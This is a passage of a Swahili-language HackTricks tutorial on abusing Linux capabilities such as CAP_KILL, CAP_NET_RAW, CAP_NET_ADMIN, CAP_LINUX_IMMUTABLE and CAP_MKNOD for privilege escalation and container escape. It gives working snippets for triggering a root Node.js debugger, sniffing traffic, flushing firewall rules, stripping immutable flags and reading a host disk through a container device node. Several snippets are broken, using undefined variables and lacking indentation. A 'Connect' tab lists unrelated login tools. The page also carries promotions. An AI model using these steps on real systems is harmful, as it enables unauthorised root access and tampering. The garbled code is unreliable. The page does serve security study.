Uwezo huu unaruhusu **kutoa uwezo wowote kwa faili za binary**, hivyo tunaweza kufikiria kuhusu **kutoroka** kutoka kwenye chombo kwa **kutumia uwezo mwingine uliovunjika** uliotajwa kwenye ukurasa huu.\
Hata hivyo, ikiwa utajaribu kutoa uwezo wa CAP\_SYS\_ADMIN na CAP\_SYS\_PTRACE kwa faili ya gdb, utagundua kuwa unaweza kutoa uwezo huo, lakini **faili ya binary haitaweza kutekelezwa baada ya hapo**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Kutoka kwa nyaraka](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Kuruhusiwa: Hii ni **seti ya kikomo kwa uwezo halisi** ambao mchakato unaweza kutumia. Pia ni seti ya kikomo kwa uwezo ambao unaweza kuongezwa kwenye seti ya kurithiwa na mchakato ambao **haujapata uwezo wa CAP\_SETPCAP** kwenye seti yake ya uwezo halisi._\
Inaonekana kama uwezo ulioruhusiwa unapunguza uwezo ambao unaweza kutumika.\
Hata hivyo, Docker pia hutoa **CAP\_SETPCAP** kwa chaguo-msingi, kwa hivyo huenda uweze **kuweka uwezo mpya ndani ya uwezo wa kurithiwa**.\
Hata hivyo, kwenye nyaraka za uwezo huu: _CAP\_SETPCAP: \[…] **ongeza uwezo wowote kutoka kwenye seti ya mipaka ya mchakato unaopiga simu** kwenye seti yake ya kurithiwa_.\
Inaonekana kama tunaweza kuongeza kwenye seti ya kurithiwa uwezo kutoka kwenye seti ya mipaka. Hii inamaanisha kwamba **hatuwezi kuweka uwezo mpya kama CAP\_SYS\_ADMIN au CAP\_SYS\_PTRACE kwenye seti ya kurithiwa ili kuongeza uwezo wa mamlaka**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) hutoa shughuli kadhaa nyeti ikiwa ni pamoja na upatikanaji wa `/dev/mem`, `/dev/kmem` au `/proc/kcore`, kubadilisha `mmap_min_addr`, upatikanaji wa wito wa mfumo wa `ioperm(2)` na `iopl(2)`, na amri mbalimbali za diski. `FIBMAP ioctl(2)` pia imeamilishwa kupitia uwezo huu, ambao umesababisha matatizo katika [siku za nyuma](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Kulingana na ukurasa wa mwongozo, hii pia inaruhusu mmiliki kufanya `shughuli mbalimbali za kifaa maalum kwenye vifaa vingine`.

Hii inaweza kuwa na manufaa kwa **kuongeza mamlaka** na **kuvunja kizuizi cha Docker**.

## CAP\_KILL

**Hii inamaanisha kwamba ni rahisi kuua mchakato wowote.**

**Mfano na faili ya binary**

Tufikirie faili ya binary ya **`python`** ina uwezo huu. Ikiwa ungekuwa **pia unaweza kubadilisha mipangilio ya huduma au soketi** (au faili yoyote ya mipangilio inayohusiana na huduma) unaweza kuweka mlango nyuma, kisha kuua mchakato unaohusiana na huduma hiyo na kusubiri faili ya mipangilio mpya itekelezwe na mlango nyuma wako.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc na kill**

Ikiwa una uwezo wa kuuwa na kuna **programu ya node inayotumika kama root** (au kama mtumiaji tofauti), labda unaweza **kupeleka** ishara ya **SIGUSR1** na kufanya iifungue **msanidi wa node** ambapo unaweza kuunganisha.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Hii inamaanisha kuwa ni rahisi kusikiliza kwenye bandari yoyote (hata kwenye bandari zenye mamlaka).** Hauwezi kuongeza mamlaka moja kwa moja na uwezo huu.

**Mfano na binary**

Ikiwa **`python`** ina uwezo huu, itaweza kusikiliza kwenye bandari yoyote na hata kuunganisha kutoka kwenye bandari nyingine yoyote (baadhi ya huduma zinahitaji uhusiano kutoka kwenye bandari maalum za mamlaka)
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Connect" %}Weka uhusiano na mfumo wa malengo kwa kutumia njia zifuatazo:

- **SSH**: Tumia amri `ssh` kuingia kwenye mfumo wa malengo kwa kutumia kitambulisho cha SSH.
- **RDP**: Tumia amri `xfreerdp` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya RDP.
- **VNC**: Tumia amri `vncviewer` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya VNC.
- **Telnet**: Tumia amri `telnet` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya Telnet.
- **FTP**: Tumia amri `ftp` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya FTP.
- **SMB**: Tumia amri `smbclient` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya SMB.
- **HTTP**: Tumia kivinjari cha wavuti kufikia mfumo wa malengo kupitia itifaki ya HTTP.
- **HTTPS**: Tumia kivinjari cha wavuti kufikia mfumo wa malengo kupitia itifaki ya HTTPS.
- **WinRM**: Tumia amri `winrm` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya WinRM.
- **SSH Tunnel**: Tumia amri `ssh` kuunda handaki la SSH kuelekeza trafiki ya itifaki nyingine kwenye mfumo wa malengo.

Kumbuka kurekebisha amri kulingana na mazingira yako na maelezo ya mfumo wa malengo.
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uwezo unaruhusu michakato kuunda soketi za RAW na PACKET, ikiruhusu kutengeneza na kutuma pakiti za mtandao za aina yoyote. Hii inaweza kusababisha hatari za usalama katika mazingira ya kontena, kama vile kudanganya pakiti, kuingiza trafiki, na kuzunguka udhibiti wa upatikanaji wa mtandao. Watendaji wa uovu wanaweza kutumia hii kuingilia kati na ujumbe wa kontena au kuhatarisha usalama wa mtandao wa mwenyeji, haswa bila ulinzi wa kutosha wa kifaa cha moto. Zaidi ya hayo, **CAP_NET_RAW** ni muhimu kwa kontena zenye mamlaka kuunga mkono shughuli kama vile ping kupitia ombi za ICMP za aina ya RAW.

**Hii inamaanisha kuwa ni rahisi kusikiliza trafiki.** Hauwezi kuongeza mamlaka moja kwa moja na uwezo huu.

**Mfano na binary**

Ikiwa binary **`tcpdump`** ina uwezo huu, utaweza kutumia kuikamata habari ya mtandao.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Tafadhali kumbuka kuwa ikiwa **mazingira** yanatoa uwezo huu, unaweza pia kutumia **`tcpdump`** kusikiliza trafiki.

**Mfano na binary 2**

Mfano ufuatao ni msimbo wa **`python2`** ambao unaweza kuwa na manufaa katika kuvuruga trafiki ya kiolesura cha "**lo**" (**localhost**). Msimbo huu umetoka kwenye maabara "_The Basics: CAP-NET\_BIND + NET\_RAW_" kutoka [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[Uwezo wa CAP\_NET\_ADMIN](https://man7.org/linux/man-pages/man7/capabilities.7.html) unawapa mmiliki uwezo wa **kubadilisha mipangilio ya mtandao**, ikiwa ni pamoja na mipangilio ya firewall, meza za mwelekeo, ruhusa za soketi, na mipangilio ya kiolesura cha mtandao ndani ya majina ya nafasi ya mtandao yaliyofichuliwa. Pia inawezesha kuwasha **hali ya kusikiliza** kwenye vipengele vya mtandao, kuruhusu uchunguzi wa pakiti kote kwenye majina ya nafasi.

**Mfano na faili ya binary**

Tuchukulie kuwa faili ya **python binary** ina uwezo huu.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Hii inamaanisha kuwa niwezekana kubadilisha sifa za inode.** Hauwezi kuongeza mamlaka moja kwa moja na uwezo huu.

**Mfano na binary**

Ikiwa unagundua kuwa faili ni isiyo badilika na python ina uwezo huu, unaweza **kuondoa sifa ya isiyo badilika na kufanya faili iweze kubadilishwa:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Tafadhali kumbuka kuwa kawaida sifa hii isiyoweza kubadilishwa huwekwa na kuondolewa kwa kutumia:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inawezesha utekelezaji wa wito wa mfumo wa `chroot(2)`, ambao unaweza kuruhusu kutoroka kutoka kwa mazingira ya `chroot(2)` kupitia udhaifu uliojulikana:

* [Jinsi ya kutoroka kutoka kwa suluhisho tofauti za chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chombo cha kutoroka kutoka chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) sio tu inaruhusu utekelezaji wa wito wa mfumo wa `reboot(2)` kwa ajili ya kuanzisha upya mfumo, ikiwa ni pamoja na amri maalum kama `LINUX_REBOOT_CMD_RESTART2` iliyoundwa kwa jukwaa fulani la vifaa, lakini pia inawezesha matumizi ya `kexec_load(2)` na, kutoka Linux 3.17 kuendelea, `kexec_file_load(2)` kwa ajili ya kupakia mifumo ya kuyumba mpya au iliyosainiwa mtawaliwa.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) iligawanywa kutoka **CAP_SYS_ADMIN** pana katika Linux 2.6.37, ikiruhusu hasa matumizi ya wito wa `syslog(2)`. Uwezo huu unawezesha kuangalia anwani za kernel kupitia `/proc` na interfaces kama hizo wakati mipangilio ya `kptr_restrict` iko kwenye 1, ambayo inadhibiti ufunuo wa anwani za kernel. Tangu Linux 2.6.39, chaguo-msingi kwa `kptr_restrict` ni 0, maana anwani za kernel zinafunuliwa, ingawa usambazaji wengi huiweka kwenye 1 (ficha anwani isipokuwa kutoka kwa uid 0) au 2 (ficha anwani daima) kwa sababu za usalama.

Zaidi ya hayo, **CAP_SYSLOG** inaruhusu kupata matokeo ya `dmesg` wakati `dmesg_restrict` imewekwa kwenye 1. Licha ya mabadiliko haya, **CAP_SYS_ADMIN** inaendelea kuwa na uwezo wa kufanya operesheni za `syslog` kutokana na mifano ya kihistoria.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inapanua utendaji wa wito wa mfumo wa `mknod` zaidi ya kuunda faili za kawaida, FIFO (mabomba yaliyopewa majina), au soketi za uwanja wa UNIX. Hasa inaruhusu kuunda faili maalum, ambazo ni pamoja na:

- **S_IFCHR**: Faili maalum ya wahusika, ambayo ni vifaa kama vituo vya mawasiliano.
- **S_IFBLK**: Faili maalum ya kuzuia, ambayo ni vifaa kama diski.

Uwezo huu ni muhimu kwa michakato ambayo inahitaji uwezo wa kuunda faili za kifaa, kurahisisha mwingiliano wa moja kwa moja na vifaa vya vifaa kupitia vifaa vya wahusika au vifaa vya kuzuia.

Hii ni uwezo wa msingi wa docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Uwezo huu unaruhusu kufanya uongezaji wa haki za kibali (kupitia kusoma diski kamili) kwenye mwenyeji, chini ya hali zifuatazo:

1. Kuwa na ufikiaji wa awali kwa mwenyeji (bila haki za kibali).
2. Kuwa na ufikiaji wa awali kwa kontena (yenye haki za kibali (EUID 0), na uwezo wa `CAP_MKNOD`).
3. Mwenyeji na kontena wanapaswa kushiriki nafasi ya mtumiaji sawa.

**Hatua za Kuunda na Kupata Kifaa cha Kuzuia kwenye Kontena:**

1. **Kwenye Mwenyeji kama Mtumiaji wa Kawaida:**
- Tambua kitambulisho chako cha sasa cha mtumiaji na `id`, kwa mfano, `uid=1000(standarduser)`.
- Tambua kifaa cha lengo, kwa mfano, `/dev/sdb`.

2. **Ndani ya Kontena kama `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Rudi kwenye Mwenyeji:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Hii njia inaruhusu mtumiaji wa kawaida kupata na labda kusoma data kutoka `/dev/sdb` kupitia kontena, kwa kutumia nafasi za mtumiaji zilizoshirikiwa na ruhusa zilizowekwa kwenye kifaa.

### CAP_SETPCAP

**CAP_SETPCAP** inawezesha mchakato kubadilisha seti za uwezo za mchakato mwingine, kuruhusu kuongeza au kuondoa uwezo kutoka kwenye seti za uwezo zilizopo, kurithiwa, na kuruhusiwa. Walakini, mchakato huo unaweza tu kubadilisha uwezo ambao una katika seti yake ya kuruhusiwa, kuhakikisha kuwa hauwezi kuinua mamlaka ya mchakato mwingine zaidi ya mamlaka yake mwenyewe. Maboresho ya hivi karibuni kwenye kernel yameimarisha sheria hizi, kuzuia `CAP_SETPCAP` kufanya tu uwezo wa kupunguza katika seti zake za kuruhusiwa au za watoto wake, lengo likiwa kupunguza hatari za usalama. Matumizi yanahitaji kuwa na `CAP_SETPCAP` katika seti ya uwezo inayofanya kazi na uwezo wa lengo katika seti ya kuruhusiwa, kwa kutumia `capset()` kwa marekebisho. Hii inafupisha kazi kuu na mipaka ya `CAP_SETPCAP`, ikionyesha jukumu lake katika usimamizi wa mamlaka na kuimarisha usalama.

**`CAP_SETPCAP`** ni uwezo wa Linux ambao inaruhusu mchakato kubadilisha seti za uwezo za mchakato mwingine. Inatoa uwezo wa kuongeza au kuondoa uwezo kutoka kwenye seti za uwezo zilizopo, kurithiwa, na kuruhusiwa za mchakato mwingine. Walakini, kuna vizuizi fulani juu ya jinsi uwezo huu unaweza kutumika.

Mchakato wenye `CAP_SETPCAP` **anaweza tu kutoa au kuondoa uwezo ambao upo katika seti yake ya uwezo iliyoruhusiwa**. Kwa maneno mengine, mchakato hauwezi kutoa uwezo kwa mchakato mwingine ikiwa hauna uwezo huo mwenyewe. Kizuizi hiki kinazuia mchakato kuinua mamlaka ya mchakato mwingine zaidi ya kiwango chake cha mamlaka.

Zaidi ya hayo, katika toleo jipya la kernel, uwezo wa `CAP_SETPCAP` umepata **kizuizi zaidi**. Sasa haikuruhusu mchakato kubadilisha seti za uwezo za mchakato mwingine kwa hiari. Badala yake, **inaruhusu mchakato kupunguza uwezo katika seti yake ya uwezo iliyoruhusiwa au seti ya uwezo iliyoruhusiwa ya watoto wake**. Mabadiliko haya yalifanywa ili kupunguza hatari za usalama zinazohusiana na uwezo huo.

Ili kutumia `CAP_SETPCAP` kwa ufanisi, unahitaji kuwa na uwezo huo katika seti yako ya uwezo inayofanya kazi na uwezo wa lengo katika seti yako ya uwezo iliyoruhusiwa. Kisha unaweza kutumia wito wa mfumo wa `capset()` kubadilisha seti za uwezo za mchakato mwingine.

Kwa muhtasari, `CAP_SETPCAP` inaruhusu mchakato kubadilisha seti za uwezo za mchakato mwingine, lakini hauwezi kutoa uwezo ambao hauna mwenyewe. Zaidi ya hayo, kutokana na wasiwasi wa usalama, utendaji wake umepunguzwa katika toleo jipya la kernel ili kuruhusu tu kupunguza uwezo katika seti yake ya uwezo iliyoruhusiwa au seti ya uwezo iliyoruhusiwa ya watoto wake.

## Marejeo

**Mifano mingi ya hii ilichukuliwa kutoka kwa maabara fulani za** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), kwa hivyo ikiwa unataka kufanya mazoezi ya mbinu hizi za kuongeza mamlaka, napendekeza maabara haya.

**Marejeo mengine**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila uwanja.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
